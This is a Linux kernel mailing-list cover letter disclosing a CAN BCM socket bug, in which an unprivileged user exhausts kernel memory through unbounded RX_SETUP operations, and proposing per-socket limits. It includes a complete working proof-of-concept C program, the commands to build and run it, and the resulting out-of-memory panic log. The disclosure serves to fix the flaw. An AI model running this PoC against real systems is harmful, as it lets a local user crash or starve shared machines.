Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=209.85.216.42
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1793099939;
	b=sppeHMFtBF2M1m6KOkPGmY3IV+jte7TUT2Qjm1IJakje1txhaX0L4zSk2RTp6RLSNCtu
	 HF2bu8YoFjhYDOsgBOyZXSGQUaDQe07N6d7j59f5LPe8LGch0NuUktXja8oOqk4IUfrLN
	 IyBgX9pgoujkunkiM/+GFREI01K2xbr9fCSd6B/UxjEoOXqQFAQQBqN3kBmtiAqWF2cIc
	 vP3haeowTqfrMjXsLoZhKUKN8mvucgRzilr337wnfbRXPh/XwslYY1cXJ3DG1aLTM0y1+
	 J3BrNYaRvP5tYm72jDnXTXvFmB1qv4CrpbD20zYjlsOsD80xchI/hlkGaB/ktOsQKMg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793099939;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding;
	bh=/xc0MAx2rlNZw/FEHnUnxhshMsCTbzWxQcdT6BcSzOo=;
	b=KGJH/HSN8zjPn0EwQbbwr+LqyR17omqcCiP+XX41mE6lILYPE8LeqI4mhp0K0yqVluWM
	 cnKA9O22CyOSubg57rES2I1rJXrnGBwaNdDD1VlFPRacTbdOqT4sn6w6rgubylgtRG4Hn
	 5XAnf4RhBsv1EblL8EH15S52hUaqMw4yYwnY156H9sL8zVbo58pv30Xsk3Z4ybqeh4Qra
	 /G4O3klV7JGUFNg0ypVm3gAImeWf3dDxx8ELOJ5zpGaw/a6rvAdQjmBz/w3BOm+SwKOzE
	 /i/78544/7HdtlFY006fe6wEOb0QBhz+Tir8k0jBmr/hwjMW9UJKlBkOH1+vshKpJ2A==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=CVP6V9W+;
	arc=none smtp.remote-ip=209.85.216.42
Received: from mail-pj1-f42.google.com (mail-pj1-f42.google.com [209.85.216.42])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DF3CC606A31F
	for <linux-can@vger.kernel.org>; Tue, 27 Oct 2026 11:18:58 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org DF3CC606A31F
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=CVP6V9W+
Received: by mail-pj1-f42.google.com with SMTP id 98e67ed59e1d1-3ab41538192so2953427a91.0
        for <linux-can@vger.kernel.org>; Tue, 27 Oct 2026 04:18:58 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1793099938; x=1793704738; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=/xc0MAx2rlNZw/FEHnUnxhshMsCTbzWxQcdT6BcSzOo=;
        b=CVP6V9W+2N1HB8zBPOCqPl3qR6bwlBX3Uui4+oh7goeLb3cNSLsRCNPywy765wVZcl
         t+2iV9/hBqvflOm2e5LwL7g0D/BuPaMgKlJS00S5Y2vYd0gPje3WswQ4c76uOF5mB/74
         dRRcSnzrCn1HbaLBtIdklsPn4oER1qnnxfaOQ8K58QglnayTuXfeu9KGH0P8F+pVWJfn
         9DBt5oDwjkrogD0HdtubHtCNYQY6ejEMwvBG80QES2R1/35QBlLkKzAV+//AVdofMuT1
         znlUk8kAdBJU4vPFhYzoRMBN8xo0MGJchLUdV4PXF6NAiUJhYLdgOAcDvgDjVKKlfk0s
         JrNg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1793099938; x=1793704738;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=/xc0MAx2rlNZw/FEHnUnxhshMsCTbzWxQcdT6BcSzOo=;
        b=hDdgkufUDTybPOKDDB+oEFGSSlXF8jYF2EO+DufOBp2/JNffrc3H/PW+V4BIZbQCpj
         qmF4SZapIqzDj9O/N2QFEc8TjUhh5HyYDRR0LpGadVcV4m+7I8u4qh1OR/crQ995We8a
         3Sfal36S2dYs3JFHUAVY1JYByNqoG8mB7aew6KJeA614PwuZnRWidrxRJ9DQJDyKwttW
         OL8Vot2mVTSK4V9DVAgZZHbjzaK8/yOr4mvrgo+kx2GWdi76kXFJOsUtBARDJcKm6WDy
         MnZo1a5FxVcre0NsxvIXZWqJuKEGEM8KBsGT/gu8HumGFA3cBrbNXl5W2F/YOVaTAKiv
         5opg==
X-Gm-Message-State: AFq9FYKPH6hosQ2x4GEgeqLg+Vsoi5nGeAXNad40ubC3azFhXivxuVTD
	NR5MO1KqfCcSRtz/+c+19SBOXgkEyQBabbQqoVYZAtaX0ho1QTIpcVvQV+GMpZCz6w+wAm3ohQQ
	yeX3Zeg==
X-Gm-Gg: AYBFou2hoTcl5PG6syiqsQXsKWvvKStiS0HUmRgbTN6pMWWUaW2Ci7RoaSycb9dPwQf
	TnvwbxLf2rTDq+ZzZTyw7WJS46VK86xwX4EEuflYcFt07IvA0dgyP33xnCUSgdI+Q9ARIZYtGMP
	F38S5+wkb5lHJYia2iPwNG0C+muzlH2UTEu/eQ45DsOWtnaQ6I4kPimGG9XxIQnO8C4Gk/F0rw1
	ApckAYMbfQeldkF6jVcQQTZdLXVltvOST9vtAjPqpzK0GWHT+LhVUMIhBRnN7QDtu/0RD75W1PG
	6o3pv9ymxWkTuBjmICwM+AB5rNZfH6liOSLfjFH8GsE0zEfNecXwjmrzKHhcV/6mjDdiNue7Lgj
	STbdVBLYvPjfqkLL9pJ07EfRcl31PdF75chmroeQWYBqIcvFGlf4BqkJm59yBm3zem3GpHIUKFM
	Z97D7RXQXuUW0lIK6sgWlYFGFq9ZlgdfnUuCqkaWTMq/OCuffO0FIFAcM9M7gqFCpXhhi0FiR2b
	V1pu9jdBZSj+rZbIN3AakL+JA+/y8SaDCEfM9026hQl9QdSISTVmne3tnMLsYZ/nYjChqCZCq8T
	Fg9vxgFCBEw=
X-Received: by 2002:a17:90a:e18c:b0:3ad:13fe:41ba with SMTP id 98e67ed59e1d1-3adeb11f8f5mr7767494a91.52.1793099938003;
        Tue, 27 Oct 2026 04:18:58 -0700 (PDT)
Received: from 24c857d0c3be.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3ae404276e6sm3555163a91.3.2026.10.27.04.18.54
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 27 Oct 2026 04:18:57 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: linux-can@vger.kernel.org
Cc: socketcan@hartkopp.net,
	mkl@pengutronix.de,
	davem@davemloft.net,
	urs.thuermann@volkswagen.de,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net 0/1] can: bcm: bound per-socket RX operation resources
Date: Tue, 27 Oct 2026 11:18:48 +0000
Message-ID: <cover.1793089479.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
X-Mailing-List: linux-can@vger.kernel.org
List-Id: <linux-can.vger.kernel.org>
List-Post: <mailto:linux-can@vger.kernel.org>
List-Help: <mailto:linux-can+help@vger.kernel.org>
List-Subscribe: <mailto:linux-can+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-can+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-can+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found an issue in net/can/bcm.c.
The bug is reachable by an unprivileged local user.
The relevant details are provided below.

---- details below ----

An LLM was used to help create this patch.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11134 (11134)

Bug details:

bcm_rx_setup() limits frames in one operation but not the number of
operations attached to a socket. Distinct CAN IDs create distinct
operations; with ifindex 0, a local unprivileged process needs no CAN
device. CAN-FD operations allocate frame arrays and CAN receiver
objects outside socket buffer accounting, allowing repeated requests
to consume kernel memory.

Limit each socket to 1024 RX operations/receivers and 16 MiB of BCM
operation and frame-array allocations. Keep operation charges until
the operation is freed, and receiver charges until CAN-core RCU
reclamation frees each receiver. Reject requests over the limits with
-ENOBUFS.

Reproducer:

Build the included PoC source with:

    cc -O2 -Wall -Wextra -o poc poc.c

In the guest's initial user and network namespaces, as root, configure
OOM panic to capture the crash:

    echo 0 > /proc/sys/kernel/panic_on_warn
    echo 2 > /proc/sys/vm/panic_on_oom
    echo 0 > /proc/sys/vm/oom_kill_allocating_task

Then, as the unprivileged guest user test_user (UID 1001), run:

    ./poc 0 1000

No namespace setup, added capabilities, or CAN device is required; the
socket uses ifindex 0. Root is used only to set the OOM sysctls.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE

#include <errno.h>
#include <inttypes.h>
#include <linux/can.h>
#include <linux/can/bcm.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define BCM_NFRAMES 257U
#define DEFAULT_PROGRESS_STEP 1000U

struct rx_setup_req {
	struct bcm_msg_head head;
	struct canfd_frame frames[BCM_NFRAMES];
};

static void die(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static unsigned long parse_ul(const char *arg, const char *name)
{
	char *end = NULL;
	unsigned long value;

	errno = 0;
	value = strtoul(arg, &end, 0);
	if (errno || !end || *end != '\0') {
		fprintf(stderr, "invalid %s: %s\n", name, arg);
		exit(EXIT_FAILURE);
	}

	return value;
}

int main(int argc, char **argv)
{
	unsigned long max_ops = 0;
	unsigned long progress_step = DEFAULT_PROGRESS_STEP;
	unsigned long hold_seconds = 0;
	struct sockaddr_can addr = {
		.can_family = AF_CAN,
		.can_ifindex = 0,
	};
	struct rx_setup_req *req;
	size_t req_len;
	unsigned long i;
	int fd;

	if (argc > 1)
		max_ops = parse_ul(argv[1], "max_ops");
	if (argc > 2)
		progress_step = parse_ul(argv[2], "progress_step");
	if (argc > 3)
		hold_seconds = parse_ul(argv[3], "hold_seconds");
	if (!progress_step)
		progress_step = DEFAULT_PROGRESS_STEP;

	req = aligned_alloc(8, sizeof(*req));
	if (!req)
		die("aligned_alloc");

	memset(req, 0, sizeof(*req));
	req->head.opcode = RX_SETUP;
	req->head.flags = CAN_FD_FRAME;
	req->head.nframes = BCM_NFRAMES;

	for (i = 0; i < BCM_NFRAMES; i++) {
		req->frames[i].len = CANFD_MAX_DLEN;
		memset(req->frames[i].data, (int)i, sizeof(req->frames[i].data));
	}

	req_len = sizeof(*req);

	fd = socket(PF_CAN, SOCK_DGRAM, CAN_BCM);
	if (fd < 0)
		die("socket(PF_CAN, SOCK_DGRAM, CAN_BCM)");

	if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("connect(AF_CAN, ifindex=0)");

	for (i = 0; !max_ops || i < max_ops; i++) {
		ssize_t written;
		uint32_t id = (uint32_t)((i + 1) & CAN_EFF_MASK);

		req->head.can_id = CAN_EFF_FLAG | id;

		written = send(fd, req, req_len, 0);
		if (written < 0) {
			fprintf(stderr,
				"send failed after %lu RX_SETUP operations: %s\n",
				i, strerror(errno));
			return EXIT_FAILURE;
		}

		if ((i + 1) % progress_step == 0) {
			fprintf(stderr,
				"installed=%lu bytes_per_req=%zu total_payload=%" PRIu64 "\n",
				i + 1, req_len, (uint64_t)(i + 1) * req_len);
		}
	}

	fprintf(stderr, "completed %lu RX_SETUP operations without send failure\n",
		i);
	if (hold_seconds) {
		fprintf(stderr, "holding socket open for %lu seconds\n",
			hold_seconds);
		sleep(hold_seconds);
	}
	return EXIT_SUCCESS;
}

------END PoC--------

----BEGIN crash log----

The stack below is decoded with source locations from the DWARF5,
reduced-debug-info build. The guest OOM was triggered during
`bcm_sendmsg()` allocation at `net/can/bcm.c:1431`.

[   95.493290][ T9374] poc invoked oom-killer: gfp_mask=0x40cc0(GFP_KERNEL|__GFP_COMP), order=3, oom_score_adj=0
[   95.493324][ T9374] Call Trace:
[   95.493466][ T9374]  dump_header (mm/oom_kill.c:464)
[   95.493544][ T9374]  out_of_memory (mm/oom_kill.c:1075 mm/oom_kill.c:1143)
[   95.493555][ T9374]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[   95.493567][ T9374]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
[   95.493636][ T9374]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
[   95.493866][ T9374]  __kmalloc_noprof (mm/slub.c:5402 mm/slub.c:5439)
[   95.493899][ T9374]  ? bcm_sendmsg (include/linux/slab.h:995 include/linux/slab.h:1211 net/can/bcm.c:1431 net/can/bcm.c:1739)
[   95.493920][ T9374]  bcm_sendmsg (include/linux/slab.h:995 include/linux/slab.h:1211 net/can/bcm.c:1431 net/can/bcm.c:1739)
[   95.493933][ T9374]  ? __pfx_bcm_sendmsg (net/can/bcm.c:528)
[   95.493971][ T9374]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
[   95.494018][ T9374]  ? __pfx_bcm_sendmsg (net/can/bcm.c:528)
[   95.494027][ T9374]  ? __pfx___sys_sendto (net/socket.c:2235)
[   95.497355][ T9374] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  can: bcm: limit RX operation resource usage per socket

 include/linux/can/core.h |   7 +++
 net/can/af_can.c         |  34 +++++++++-
 net/can/af_can.h         |   1 +
 net/can/bcm.c            | 131 ++++++++++++++++++++++++++++++++-------
 4 files changed, 147 insertions(+), 26 deletions(-)

-- 
2.43.0

